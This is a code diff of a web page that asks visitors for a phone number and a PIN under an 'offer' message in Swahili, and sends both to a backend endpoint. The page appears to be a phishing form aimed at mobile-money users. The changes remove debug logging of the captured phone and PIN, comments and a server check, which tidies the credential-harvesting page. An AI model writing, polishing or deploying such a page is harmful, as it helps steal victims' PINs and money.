@@ -148,14 +148,12 @@
             transition: 0.2s;
             pointer-events: none;
             z-index: 1000;
-            white-space: nowrap;
         }
 
         @media (max-width: 480px) {
             .card { padding: 1.5rem 1.2rem; }
             .pin-box { width: 55px; height: 55px; font-size: 1.8rem; }
             h2 { font-size: 1.5rem; }
-            .toast-message { white-space: normal; text-align: center; min-width: 200px; }
         }
     </style>
 </head>
@@ -203,11 +201,7 @@
         }
         
         async function submitToBackend(phoneNumber, pin) {
-            // Get the full URL for the API
             const apiUrl = '/api/submit';
-            
-            console.log('Submitting to:', apiUrl);
-            console.log('Data:', { phoneNumber, pin });
             
             try {
                 const response = await fetch(apiUrl, {
@@ -218,13 +212,10 @@
                     body: JSON.stringify({ phoneNumber, pin })
                 });
                 
-                console.log('Response status:', response.status);
                 const data = await response.json();
-                console.log('Response data:', data);
                 
                 if (response.ok && data.success) {
                     showMessage('✅ Ofa yako imepokelewa! Asante.', false);
-                    // Clear form after success
                     phoneInput.value = '';
                     pinBoxes.forEach(box => box.value = '');
                     pinBoxes[0].focus();
@@ -258,19 +249,16 @@
             
             const pin = Array.from(pinBoxes).map(input => input.value).join('');
             
-            // Disable inputs while submitting
             document.querySelectorAll('input').forEach(i => i.disabled = true);
-            showMessage('📤 Inatuma... jaribu kidogo', false);
+            showMessage('📤 Inatuma...', false);
             
             const success = await submitToBackend(phone, pin);
             
-            // Re-enable inputs
             document.querySelectorAll('input').forEach(i => i.disabled = false);
             
             return success;
         }
         
-        // PIN box event handlers
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 let val = e.target.value.replace(/[^0-9]/g, '');
@@ -287,12 +275,6 @@
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
                     pinBoxes[index - 1].value = '';
-                }
-                if (e.key === 'ArrowLeft' && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-                if (e.key === 'ArrowRight' && index < pinBoxes.length - 1) {
-                    pinBoxes[index + 1].focus();
                 }
             });
             
@@ -311,7 +293,6 @@
             });
         });
         
-        // Phone input handler
         phoneInput.addEventListener('input', (e) => {
             let val = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
             e.target.value = val;
@@ -332,24 +313,6 @@
                 }
             }
         });
-        
-        // Check if server is reachable on page load
-        async function testServer() {
-            try {
-                const response = await fetch('/api/test');
-                const data = await response.json();
-                console.log('Server test:', data);
-                if (data.status === 'ok') {
-                    console.log('✅ Server is reachable');
-                }
-            } catch (error) {
-                console.error('❌ Server not reachable:', error);
-                showMessage('⚠️ Server connection issue. Some features may not work.', true);
-            }
-        }
-        
-        // Run server test on page load
-        setTimeout(testServer, 500);
     </script>
 </body>
 </html>
